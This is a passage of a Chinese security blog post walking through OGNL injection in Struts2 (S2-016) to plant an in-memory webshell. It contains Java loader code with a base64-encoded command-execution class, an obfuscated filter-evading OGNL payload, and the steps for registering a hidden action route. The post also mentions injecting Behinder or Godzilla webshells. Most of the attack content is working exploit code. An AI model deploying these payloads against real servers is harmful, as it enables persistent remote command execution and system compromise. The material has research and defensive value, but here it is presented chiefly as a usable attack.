                <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">var472</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"defineClass"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">);</span>  
                <span class="n">var472</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  

            <span class="k">try</span> <span class="o">{</span>  
                <span class="n">Class</span> <span class="n">var482</span> <span class="o">=</span>  <span class="o">(</span><span class="n">Class</span><span class="o">)</span><span class="n">var472</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">loader2</span><span class="o">,</span> <span class="s">"com.opensymphony.xwork2.config.entities.ActionConfig"</span><span class="o">,</span> <span class="n">decode2</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="s">"0"</span><span class="o">),</span> <span class="n">decode2</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>  

                <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">var482</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">});</span>  
                <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  

                <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LinkedHashMap</span> <span class="n">o1</span> <span class="o">=</span> <span class="o">(</span><span class="n">LinkedHashMap</span><span class="o">)</span> <span class="n">obj5</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"/"</span><span class="o">);</span>  
                <span class="n">o1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"onlysecurity"</span><span class="o">,</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="s">"f0ng"</span><span class="o">,</span> <span class="s">"onlysecurity"</span><span class="o">,</span> <span class="s">"com.demo.action.Cmd"</span><span class="o">));</span>  

            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e2</span><span class="o">){</span>  
            <span class="o">}</span>  

        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>  
        <span class="o">}</span>  
    <span class="o">}</span>  
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LinkedHashMap</span> <span class="n">obj5</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>  
        <span class="n">hello</span> <span class="n">aa</span> <span class="o">=</span> <span class="k">new</span> <span class="n">hello</span><span class="o">(</span><span class="n">obj5</span><span class="o">);</span>  
    <span class="o">}</span>  
<span class="o">}</span>
</pre></div>
<p>payload如下:</p>
<div class="highlight"><pre><span></span>redirect:http://www.baidu.com<span class="si">${#</span><span class="nv">req</span><span class="p">=#context.get(</span><span class="s1">'co'</span><span class="p">+</span><span class="s1">'m.open'</span><span class="p">+</span><span class="s1">'symphony.xwo'</span><span class="p">+</span><span class="s1">'rk2.disp'</span><span class="p">+</span><span class="s1">'atcher.HttpSer'</span><span class="p">+</span><span class="s1">'vletReq'</span><span class="p">+</span><span class="s1">'uest'</span><span class="p">),#resp=#context.get(</span><span class="s1">'co'</span><span class="p">+</span><span class="s1">'m.open'</span><span class="p">+</span><span class="s1">'symphony.xwo'</span><span class="p">+</span><span class="s1">'rk2.disp'</span><span class="p">+</span><span class="s1">'atcher.HttpSer'</span><span class="p">+</span><span class="s1">'vletRes'</span><span class="p">+</span><span class="s1">'ponse'</span><span class="p">),#resp.setCharacterEncoding(</span><span class="s1">'UTF-8'</span><span class="p">),#ot=#resp.getWriter (),#inv=#context.get(</span><span class="s1">'co'</span><span class="p">+</span><span class="s1">'m.open'</span><span class="p">+</span><span class="s1">'symphony.xwo'</span><span class="p">+</span><span class="s1">'rk2.ActionContext.a'</span><span class="p">+</span><span class="s1">'ctionInvocation'</span><span class="p">),#f2=#context.get(</span><span class="s1">'co'</span><span class="p">+</span><span class="s1">'m.open'</span><span class="p">+</span><span class="s1">'symphony.xwo'</span><span class="p">+</span><span class="s1">'rk2.ActionContext.a'</span><span class="p">+</span><span class="s1">'ctionInvocation'</span><span class="p">).getClass().getDeclaredField(</span><span class="s2">"proxy"</span><span class="p">),#f2.setAccessible(true),#obj=#f2.get(#inv),#f3=#obj.getClass().getSuperclass().getDeclaredField(</span><span class="s2">"configuration"</span><span class="p">),#f3.setAccessible(true),#obj2=#f3.get(#obj),#f4=#obj2.getClass().getDeclaredField(</span><span class="s2">"runtimeConfiguration"</span><span class="p">),#f4.setAccessible(true),#obj3=#f4.get(#obj2),#f5=#obj3.getClass().getDeclaredField(</span><span class="s2">"namespaceActionConfigs"</span><span class="p">),#f5.setAccessible(true),#obj4=#f5.get(#obj3),#f6=#obj4.getClass().getDeclaredField(</span><span class="s2">"m"</span><span class="p">),#f6.setAccessible(true),#obj5=#f6.get(#obj4),#bb0=new java.net.URL[]{new java.net.URL(</span><span class="s2">"file:/xxxxx/xxxxx/"</span><span class="p">)</span><span class="si">}</span>,#cc0<span class="o">=</span>new java.net.URLClassLoader<span class="o">(</span><span class="c1">#bb0),#cc1=#cc0.loadClass("hello"),#cc1.getDeclaredMethods()[0].invoke("main",new java.lang.String[]{"a"},#obj5),#ot.println(ClassLoader.getSystemClassLoader()),#ot.flush(),#ot.close()}</span>
</pre></div>
<p>成功的进度条进了一步，但是出现了一个很诡异的问题</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131454-d60e5332-b726-1.png"/></p>
<p>类名一样，还不能强转？amazing！</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131501-da5a84d8-b726-1.png"/></p>
<p>茅塞顿开！</p>
<h4 data-content="1" id="7319e596ee770a655d64922d69051dae">0x02 问题2</h4>
<p>还是classloader的问题，那么就去翻阅struts2的文档了，去找一些可能可以获取到classloader的地方，如下：</p>
<pre><code>application对象：用于访问ServletContext，例如#application.userName或者#application['userName']，相当于调用ServletContext的getAttribute("username")。

session对象：用来访问HttpSession，例如#session.userName或者#session['userName']，相当于调用session.getAttribute("userName")。

request对象：用来访问HttpServletRequest属性（attribute）的Map，例如#request.userName或者#request['userName']，相当于调用request.getAttribute("userName")。

parameters对象：用于访问HTTP的请求参数，例如#parameters.userName或者#parameters['userName']，相当于调用request.getParameter("username")。

attr对象：用于按page-&gt;request-&gt;session-&gt;application顺序访问其属性。</code></pre>
<p>不清楚的话，就直接通过ognl表达式去打印出来</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131515-e2534cc4-b726-1.png"/></p>
<p>其实这里还有个相当于隐藏的参数，#this，当前类</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131520-e5c32df2-b726-1.png"/></p>
<p>这里也就是重点，通过<code>#this.class.getClassLoader()</code>去获取类加载器，不放心，打印一下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131527-e9bda36a-b726-1.png"/></p>
<p>仿佛在哪里看到过，回过头去action注入的时候debug一下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131535-ee9ec33c-b726-1.png"/></p>
<p>bingo，完全是一模一样，这就相当于找classloader成功了</p>
<h3 data-content="1" id="053919669ca02c656e8cc5a5c08f2e29">0x04 ognl注入内存马</h3>
<p>给出hello.java文件<br/>
hello.java</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.util.LinkedHashMap</span><span class="o">;</span>

<span class="cm">/**</span>
<span class="cm"> * @DESCRIPTION:</span>
<span class="cm"> * @USER: f0ng</span>
<span class="cm"> * @DATE: 2023/2/23 下午3:44</span>
<span class="cm"> */</span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">hello</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="nf">hello</span><span class="o">(</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Map</span> <span class="n">obj5</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>

            <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="s">"yv66vgAAADQApAoAIQBFCgBGAEcHAEgIAEkKAEYASgcASwgATAcATQsACABOBwBPCgBQAFEIAFILAAYAUwoAUABUCgBVAFYKAAoAVwgAWAoACgBZCgAKAFoKAFsAXAoAWwBdCgBeAF8HAGAKAGEAYgoAXgBjCgBkAGUJAGYAZwoAaABpCgBqAGsKADoAbAoAbQBuCgBqAFwHAG8BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFUxjb20vZGVtby9hY3Rpb24vQ21kOwEAB2V4ZWN1dGUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAApFeGNlcHRpb25zBwBwAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABHBvb2wBABVMamF2YXNzaXN0L0NsYXNzUG9vbDsBAAVjbGF6egEAE0xqYXZhc3Npc3QvQ3RDbGFzczsBAAdlbmNvZGVyBwBxAQAHRW5jb2RlcgEADElubmVyQ2xhc3NlcwEAGkxqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXI7AQABcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwcAcgcAcwcAdAEAClNvdXJjZUZpbGUBAAhDbWQuamF2YQwAIgAjBwB1DAB2AHcBACBvcmcvYXBhY2hlL3N0cnV0czIvU3RydXRzU3RhdGljcwEANWNvbS5vcGVuc3ltcGhvbnkueHdvcmsyLmRpc3BhdGNoZXIuSHR0cFNlcnZsZXRSZXF1ZXN0DAB4AHkBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQA2Y29tLm9wZW5zeW1waG9ueS54d29yazIuZGlzcGF0Y2hlci5IdHRwU2VydmxldFJlc3BvbnNlAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UMAHoAewEAEWphdmEvdXRpbC9TY2FubmVyBwB8DAB9AH4BAAFjDAB/AIAMAIEAggcAgwwAhACFDAAiAIYBAAJcQQwAhwCIDACJACoHAIoMAIsAjAwAjQAjBwCODACPAJABABNjb20vZGVtby9hY3Rpb24vQ21kBwCRDACSACoMAHgAkwcAlAwAlQCWBwCXDACYAJkHAJoMAJsAnAcAnQwAiwCeDACfAKAHAKEMAKIAowEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAYamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyAQAbamF2YXNzaXN0L05vdEZvdW5kRXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAIGphdmFzc2lzdC9DYW5ub3RDb21waWxlRXhjZXB0aW9uAQAlY29tL29wZW5zeW1waG9ueS94d29yazIvQWN0aW9uQ29udGV4dAEACmdldENvbnRleHQBACkoKUxjb20vb3BlbnN5bXBob255L3h3b3JrMi9BY3Rpb25Db250ZXh0OwEAA2dldAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEAE2phdmFzc2lzdC9DbGFzc1Bvb2wBAApnZXREZWZhdWx0AQAXKClMamF2YXNzaXN0L0NsYXNzUG9vbDsBAA9qYXZhL2xhbmcvQ2xhc3MBAAdnZXROYW1lAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXNzaXN0L0N0Q2xhc3M7AQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBABwoKUxqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAEWphdmFzc2lzdC9DdENsYXNzAQAKdG9CeXRlY29kZQEABCgpW0IBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAEKEkpVgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TdHJpbmcBAAZsZW5ndGgBAAMoKUkAIQAXACEAAAAAAAMAAQAiACMAAQAkAAAALwABAAEAAAAFKrcAAbEAAAACACUAAAAGAAEAAAAQACYAAAAMAAEAAAAFACcAKAAAAAEAKQAqAAIAJAAAAJoABgADAAAATLgAAhIEtgAFwAAGTLgAAhIHtgAFwAAITSy5AAkBALsAClm4AAsrEgy5AA0CALYADrYAD7cAEBIRtgAStgATtgAULLkACQEAtgAVAbAAAAACACUAAAAWAAUAAAATAAwAFAAYABYAQQAXAEoAGAAmAAAAIAADAAAATAAnACgAAAAMAEAAKwAsAAEAGAA0AC0ALgACAC8AAAAEAAEAMAAJADEAMgACACQAAACpAAIABQAAADu4ABZMKxIXtgAYtgAZTbgAGk6yABsstgAcvrYAHS0stgActgAeOgSyABsZBLYAH7YAHbIAGxkEtgAgsQAAAAIAJQAAACIACAAAAB0ABAAfAA4AIQASACMAHQAkACcAJQAyACYAOgAnACYAAAA0AAUAAAA7ADMANAAAAAQANwA1ADYAAQAOAC0ANwA4AAIAEgApADkAPQADACcAFAA+AD8ABAAvAAAACAADAEAAQQBCAAIAQwAAAAIARAA8AAAACgABADoAZAA7AAk="</span><span class="o">;</span>
            <span class="n">ClassLoader</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">loader</span><span class="o">);</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">var47</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"defineClass"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">);</span>
            <span class="n">var47</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
            <span class="n">var47</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">loader</span><span class="o">,</span> <span class="s">"com.demo.action.Cmd"</span><span class="o">,</span> <span class="n">decode</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="s">"0"</span><span class="o">),</span> <span class="n">decode</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"com.opensymphony.xwork2.config.entities.ActionConfig"</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">});</span>
                <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>

                <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LinkedHashMap</span> <span class="n">o1</span> <span class="o">=</span> <span class="o">(</span><span class="n">LinkedHashMap</span><span class="o">)</span> <span class="n">obj5</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">""</span><span class="o">);</span>
                <span class="n">o1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"onlysecurity"</span><span class="o">,</span>  <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="s">"f0ng"</span><span class="o">,</span> <span class="s">"onlysecurity"</span><span class="o">,</span> <span class="s">"com.demo.action.Cmd"</span><span class="o">));</span>

            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e2</span><span class="o">)</span> <span class="o">{</span>
            <span class="o">}</span>

        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>

        <span class="o">}</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">,</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Map</span> <span class="n">obj5</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>

        <span class="n">hello</span> <span class="n">aa</span> <span class="o">=</span> <span class="k">new</span> <span class="n">hello</span><span class="o">(</span><span class="n">obj5</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>编译成hello.class</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131553-f9665abe-b726-1.png"/></p>
<p>那么把<code>java.net.URLClassLoader</code>的赋值增加一个<code>#this.class.getClassLoader()</code>，直接注内存马</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131558-fc4ce6d0-b726-1.png"/></p>
<p>如此丝滑！感谢su18师傅指导！</p>
<p>这里就不放payload了，把之前文章提及的payload进行赋值增加classloader即可。</p>
<p>顺带一提，这里base64的编码笔者是没有去变的，所以用的还是参考文章里struts2内存马里面的，这里如果要自定义类的话，可以使用poc2jar文件转码中的导出文件功能</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131607-018f0a1a-b727-1.png"/></p>
<p>保存完文件，拖到idea，直接能看到代码内容：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131613-04f8f29c-b727-1.png"/></p>
<p>那么就可以注入冰蝎、哥斯拉等等方便操作的webshell了！<br/>
再次感谢su18大佬提供的冰蝎马！</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131620-094d07a2-b727-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131627-0d735e3a-b727-1.png"/></p>
<h3 data-content="1" id="f05e3463a7f7759e346504179a907805">0x05 总结</h3>
<ol>
<li>内存马的知识了解甚少，一些基础知识需要去学习</li>
<li>不能根据所掌握的知识去攻击，应该去拓展自己的知识，如这里的struts2中的<code>#this</code>变量，之前是不知道的，当知道了以后，问题就迎刃而解了</li>
<li>class.forName是取决于类加载器的，之前是URLClassloader加载器，会在其中寻找类，而又是通过file协议加载，所以会报出来classnotfound的错误</li>
<li>捕捉到异常后，new String(Arrays.toString(e.getStackTrace()))可以将详细报错捕捉到，这里用到了写入文件进行调试实例化类时遇到的报错问题，方法比较蠢，但是有效</li>
</ol>
<h4 data-content="1" id="ee57aceb090a424c6ff9324015d2d6f0">0x06 坑点</h4>
<ol>
<li>在<code>LinkedHashMap</code>对象赋值的时候，如果context是有后缀的，那么应该是obj5.get("")，没有后缀的话，那么就是obj5.get("/")</li>
</ol>
<h3 data-content="1" id="47705de887d0279d74bc343dca23ee9e">0x07 参考</h3>
<blockquote>
<p><a href="https://www.cnblogs.com/xiaozhiru/p/16163057.html" target="_blank">https://www.cnblogs.com/xiaozhiru/p/16163057.html</a>    【Struts2 的内存马】</p>
<p><a href="https://blog.csdn.net/xlgen157387/article/details/39735703" target="_blank">https://blog.csdn.net/xlgen157387/article/details/39735703</a>   【Struts2的OGNL详解】</p>
<p><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-016" target="_blank">https://github.com/vulhub/vulhub/tree/master/struts2/s2-016</a> 【Struts2 016环境】</p>
<p><a href="https://mp.weixin.qq.com/s/outtxUANOa406ErGleWjtQ" target="_blank">https://mp.weixin.qq.com/s/outtxUANOa406ErGleWjtQ</a>  【struts2绕过waf读写文件及另类方式执行命令】</p>
</blockquote>
</div>
</div>